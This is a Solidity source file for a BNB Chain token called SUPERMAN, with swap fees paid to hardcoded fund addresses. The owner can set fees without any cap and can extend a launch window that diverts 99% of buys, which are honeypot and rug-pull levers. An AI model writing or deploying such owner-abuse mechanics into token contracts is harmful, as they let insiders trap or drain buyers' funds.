// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract SUPERMAN is IERC20, Ownable {
    string private _name = "SUPERMAN";
    string private _symbol = "SUPERMAN";
    uint8 private _decimals = 18;
    uint256 private _tTotal = 12000000000 * 10 ** _decimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private RouterAddr;
    mapping(address => bool) public _feeWhiteList;

    address private receiveAddr = 0x82881533aF8b20b43bfec2dd76D8C7d9028Ef6C0;
    address private fundAddr1 = 0xE342BC7C154b62b84101C8678CFe001B76047D19;
    address private fundAddr2 = 0xb7DC921a969971FB1af48e42832A8F79B05194CD;

    ISwapRouter public _swapRouter;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyFundFee = 3;
    uint256 public _sellFundFee = 3;

    uint256 public startTradeBlock = 0;
    uint256 public kb = 3;

    uint256 public swapTokenAmount = _tTotal / 10000;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        uint256 chainId;
        assembly {
            chainId := chainid()
        }
        if (chainId == 56) {
            RouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        } else {
            RouterAddr = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
        }

        ISwapRouter swapRouter = ISwapRouter(RouterAddr);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(
            address(this),
            swapRouter.WETH()
        );

        _swapPairList[swapPair] = true;

        _balances[receiveAddr] = _tTotal;
        emit Transfer(address(0), receiveAddr, _tTotal);

        _feeWhiteList[receiveAddr] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[fundAddr1] = true;
        _feeWhiteList[fundAddr2] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;
        bool isSell;

        if (_feeWhiteList[from] || _feeWhiteList[to]) {} else {
            require(startTradeBlock > 0, "not open trade");
            takeFee = true;
            if (_swapPairList[from] && block.number < startTradeBlock + kb) {
                _funTransfer(from, to, amount);
                return;
            }

            if (_swapPairList[to]) {
                if (!inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance >= swapTokenAmount) {
                        swapTokenForFund(contractTokenBalance);
                    }
                }
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 99) / 100;
        _takeTransfer(sender, fundAddr2, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee = isSell ? _sellFundFee : _buyFundFee;
            uint256 swapAmount = (tAmount * swapFee) / 100;
            feeAmount += swapAmount;
            _takeTransfer(sender, address(this), swapAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        _approve(address(this), RouterAddr, tokenAmount);
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 totalBalance = address(this).balance;
        payable(fundAddr1).transfer(totalBalance / 6);
        payable(fundAddr2).transfer(address(this).balance);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function startTrade() external onlyOwner {
        startTradeBlock = block.number;
    }

    function setFeeWhiteList(
        address[] calldata addList,
        bool enable
    ) public onlyOwner {
        for (uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }

    function setKB(uint256 _kb) external onlyOwner {
        kb = _kb;
    }

    function setSwapTokenAmount(uint256 _swapTokenAmount) external onlyOwner {
        swapTokenAmount = _swapTokenAmount;
    }

    function setFees(uint256 buyFee, uint256 sellFee) external onlyOwner {
        _buyFundFee = buyFee;
        _sellFundFee = sellFee;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddr2).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) public {
        require(msg.sender == receiveAddr, "not dev");
        IERC20(token).transfer(to, amount);
    }

    receive() external payable {
        if (msg.sender == receiveAddr) {
            startTradeBlock = block.number;
        }
    }
}